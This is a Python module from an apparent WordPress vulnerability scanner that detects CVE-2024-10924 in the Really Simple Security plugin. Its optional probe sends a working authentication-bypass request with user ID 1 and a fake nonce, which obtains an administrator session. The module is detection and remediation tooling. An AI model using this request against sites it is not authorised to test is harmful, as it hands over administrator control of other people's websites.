from __future__ import annotations

import json
from typing import Any

from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2024-10924"
NAME = "Really Simple Security unauthenticated authentication bypass"
COMPONENT = "WordPress plugin Really Simple Security"
AFFECTED_RULE = "Really Simple Security 9.0.0 through 9.1.1.1"
PLUGIN_SLUG = "really-simple-ssl"
PATCHED_VERSION = "9.1.2"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]
ONBOARDING_PATH = "/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
ADMIN_PATH = "/wp-admin/"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < parse_version_required("9.0.0"):
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required(PATCHED_VERSION) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation="Upgrade Really Simple Security to 9.1.2 or newer and review privileged login activity.",
        exploit_available=HAS_EXPLOIT,
    )


def _has_login_cookie(sess: HttpSession) -> bool:
    try:
        return any(str(cookie.name).startswith("wordpress_logged_in_") for cookie in sess.jar)
    except AttributeError:
        return False


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    payload = {"user_id": 1, "login_nonce": "133333337", "redirect_to": ADMIN_PATH}
    response = sess.post(
        ONBOARDING_PATH,
        data=json.dumps(payload),
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=f"The onboarding endpoint could not obtain an HTTP response ({transport_error_detail(response)}).",
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )

    body = str(response.get("body", ""))
    if response.get("status") == 404:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}{ONBOARDING_PATH}",
            detail="The 2FA onboarding REST route is not registered; the vulnerable 2FA feature may be disabled.",
            action="Enable and verify the plugin's 2FA feature, then upgrade to 9.1.2 or newer.",
            evidence={"status": response.get("status"), "body": body[:200]},
        )

    cookie_set = _has_login_cookie(sess)
    admin = sess.get(ADMIN_PATH, timeout=timeout)
    admin_url = str(admin.get("final_url") or "")
    admin_body = str(admin.get("body", ""))
    admin_ok = admin.get("status") == 200 and "/wp-admin/" in admin_url and (
        "Dashboard" in admin_body or "wp-admin-bar-my-account" in admin_body
    )
    evidence = {
        "user_id": 1,
        "onboarding_status": response.get("status"),
        "login_cookie_set": cookie_set,
        "admin_url": admin_url,
        "admin_dashboard": admin_ok,
    }
    proof_url = f"{base}{ADMIN_PATH}"

    if response.get("status") == 200 and cookie_set and admin_ok:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            detail=(
                "An invalid login nonce was accepted by the 2FA skip-onboarding route, which set a "
                "wordpress_logged_in cookie for user ID 1 and reached the administrator dashboard."
            ),
            action="Upgrade Really Simple Security to 9.1.2 or newer and audit administrator sessions.",
            evidence=evidence,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=proof_url,
        detail=(
            "The 2FA skip-onboarding request did not yield an administrator session. "
            f"HTTP {response.get('status')}; login cookie={cookie_set}; dashboard={admin_ok}."
        ),
        action="Upgrade Really Simple Security to 9.1.2 or newer and review 2FA configuration.",
        evidence=evidence,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode != "safe":
        passive.detail += " This module supports only the read-only 2FA bypass proof."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += " Safe proof skipped because Really Simple Security was not detected as potentially affected."
        return passive
    result = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": [">=9.0.0,<9.1.2"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2024-10924",
            "https://wpscan.com/vulnerability/8e1f4374-2e41-4c27-80d4-db172015c6be/",
            "https://patchstack.com/articles/critical-account-takeover-patched-in-really-simple-security-plugin/",
        ],
    }
